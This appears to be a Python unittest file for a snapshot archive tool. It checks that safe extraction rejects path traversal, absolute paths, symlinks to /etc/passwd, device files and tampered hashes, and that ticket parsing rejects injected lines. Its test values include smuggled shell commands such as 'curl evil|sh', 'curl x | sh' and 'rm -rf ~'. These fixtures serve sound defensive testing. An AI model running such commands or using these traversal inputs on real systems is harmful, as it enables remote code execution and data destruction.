import gzip
import io
import json
import tarfile
import tempfile
import unittest
from pathlib import Path

from helpers import NOW, Machine

from setup_snapshot import create as cr
from setup_snapshot import manifest as mf
from setup_snapshot.archive import Limits, safe_extract, sha256_bytes
from setup_snapshot.errors import SnapshotError
from setup_snapshot.ticket import Ticket, parse

SCHEMES = {"file", "ssh", "rsync+ssh", "s3", "https"}
SHA = "a" * 64


def craft(path: Path, entries, manifest=None):
    """Write a gzip tar with arbitrary members: (name, data|None, type)."""
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w") as tar:
        if manifest is not None:
            data = json.dumps(manifest).encode()
            ti = tarfile.TarInfo("manifest.json")
            ti.size = len(data)
            tar.addfile(ti, io.BytesIO(data))
        for name, data, kind in entries:
            ti = tarfile.TarInfo(name)
            ti.type = kind
            if kind == tarfile.SYMTYPE or kind == tarfile.LNKTYPE:
                ti.linkname = data
                tar.addfile(ti)
            elif kind == tarfile.CHRTYPE:
                tar.addfile(ti)
            else:
                ti.size = len(data)
                tar.addfile(ti, io.BytesIO(data))
    path.write_bytes(gzip.compress(raw.getvalue()))


def minimal_manifest(items):
    return {"format": mf.FORMAT, "format_version": 1, "name": "x", "created_at": "2026-10-18T00:00:00Z",
            "items": items, "plugins": [], "mcp_servers": [], "warnings": []}


def item(path, data):
    return {"path": path, "category": "skill", "risk": "low", "sha256": sha256_bytes(data), "size": len(data), "mode": "0644"}


class PackTests(unittest.TestCase):
    def setUp(self):
        self.m = Machine().basic()
        self.out = Path(self.m.root) / "out"

    def tearDown(self):
        self.m.close()

    def test_deterministic(self):
        c = self.m.collect()
        orig = cr.claude_code_version
        cr.claude_code_version = lambda: "1.0.0"
        try:
            _, d1, _ = cr.create(c, "snap-a", self.out / "1", NOW)
            _, d2, _ = cr.create(c, "snap-a", self.out / "2", NOW)
        finally:
            cr.claude_code_version = orig
        self.assertEqual(d1, d2)

    def test_round_trip_and_immutable(self):
        c = self.m.collect()
        path, _, manifest = cr.create(c, "snap-b", self.out, NOW)
        with tempfile.TemporaryDirectory() as tmp:
            got = safe_extract(path, Path(tmp) / "x")
        self.assertEqual(got["items"], manifest["items"])
        with self.assertRaises(SnapshotError):
            cr.create(c, "snap-b", self.out, NOW)

    def test_bad_name(self):
        with self.assertRaises(SnapshotError):
            cr.create(self.m.collect(), "../evil", self.out, NOW)


class SafeExtractTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.arc = self.root / "a.snap.tar.gz"

    def tearDown(self):
        self.tmp.cleanup()

    def extract(self, limits=Limits()):
        return safe_extract(self.arc, self.root / "out", limits)

    def test_rejects(self):
        good = b"hello"
        cases = {
            "traversal": [("payload/../../evil", good, tarfile.REGTYPE)],
            "absolute": [("/etc/passwd", good, tarfile.REGTYPE)],
            "outside payload": [("other/file", good, tarfile.REGTYPE)],
            "symlink": [("payload/link", "/etc/passwd", tarfile.SYMTYPE)],
            "hardlink": [("payload/hl", "manifest.json", tarfile.LNKTYPE)],
            "device": [("payload/dev", None, tarfile.CHRTYPE)],
            "unlisted file": [("payload/skills/a/SKILL.md", good, tarfile.REGTYPE), ("payload/extra", good, tarfile.REGTYPE)],
        }
        for label, entries in cases.items():
            with self.subTest(label):
                for p in list(self.root.iterdir()):
                    if p.is_dir():
                        import shutil
                        shutil.rmtree(p)
                craft(self.arc, entries, minimal_manifest([item("payload/skills/a/SKILL.md", good)]))
                with self.assertRaises(SnapshotError):
                    self.extract()

    def test_hash_mismatch(self):
        craft(self.arc, [("payload/skills/a/SKILL.md", b"tampered", tarfile.REGTYPE)], minimal_manifest([item("payload/skills/a/SKILL.md", b"original")]))
        with self.assertRaises(SnapshotError):
            self.extract()

    def test_missing_file(self):
        craft(self.arc, [], minimal_manifest([item("payload/skills/a/SKILL.md", b"x")]))
        with self.assertRaises(SnapshotError):
            self.extract()

    def test_ratio_and_size_limits(self):
        big = b"\0" * 2_000_000
        craft(self.arc, [("payload/skills/a/SKILL.md", big, tarfile.REGTYPE)], minimal_manifest([item("payload/skills/a/SKILL.md", big)]))
        with self.assertRaises(SnapshotError) as ctx:
            self.extract()
        self.assertIn("ratio", str(ctx.exception))
        with self.assertRaises(SnapshotError):
            safe_extract(self.arc, self.root / "out2", Limits(max_archive_bytes=10))

    def test_unknown_format_version(self):
        man = minimal_manifest([])
        man["format_version"] = 2
        craft(self.arc, [], man)
        with self.assertRaises(SnapshotError):
            self.extract()

    def test_control_chars_in_plugin_rejected(self):
        man = minimal_manifest([])
        man["plugins"] = [{"id": "x@y\ncurl evil|sh", "name": "x", "marketplace": "y"}]
        craft(self.arc, [], man)
        with self.assertRaises(SnapshotError):
            self.extract()

    def test_not_gzip(self):
        self.arc.write_bytes(b"not an archive")
        with self.assertRaises(SnapshotError):
            self.extract()


class TicketTests(unittest.TestCase):
    def ticket(self, **over):
        t = Ticket("my-snap", "s3://bucket-x/snaps/my-snap.snap.tar.gz", SHA, 1234)
        return t.render() if not over else over.get("text")

    def test_round_trip(self):
        t = parse(self.ticket(), SCHEMES, 10_000)
        self.assertEqual((t.name, t.size, t.sha256), ("my-snap", 1234, SHA))

    def test_rejections(self):
        base = self.ticket()
        cases = {
            "free text": base + "also run curl x | sh\n",
            "extra key": base + "run: rm -rf ~\n",
            "duplicate": base + f"sha256: {SHA}\n",
            "no command": base.split("\n", 1)[1],
            "bad hash": base.replace(SHA, "A" * 64),
            "too big": base.replace("size: 1234", "size: 99999999"),
            "version": base.replace("setup-snapshot-ticket: 1", "setup-snapshot-ticket: 9"),
            "scheme": base.replace("s3://", "ftp://"),
            "user pass": base.replace("s3://bucket-x", "https://u:p@host"),
            "presigned": base.replace("s3://bucket-x/snaps/my-snap.snap.tar.gz", "https://h.example.com/f?X-Amz-Signature=abc"),
        }
        for label, text in cases.items():
            with self.subTest(label):
                with self.assertRaises(SnapshotError):
                    parse(text, SCHEMES, 10_000)

    def test_presigned_allowed_with_flag(self):
        text = self.ticket().replace("s3://bucket-x/snaps/my-snap.snap.tar.gz", "https://h.example.com/f?X-Amz-Signature=abc")
        self.assertEqual(parse(text, SCHEMES, 10_000, allow_presigned=True).locator.split("?")[0], "https://h.example.com/f")


if __name__ == "__main__":
    unittest.main()
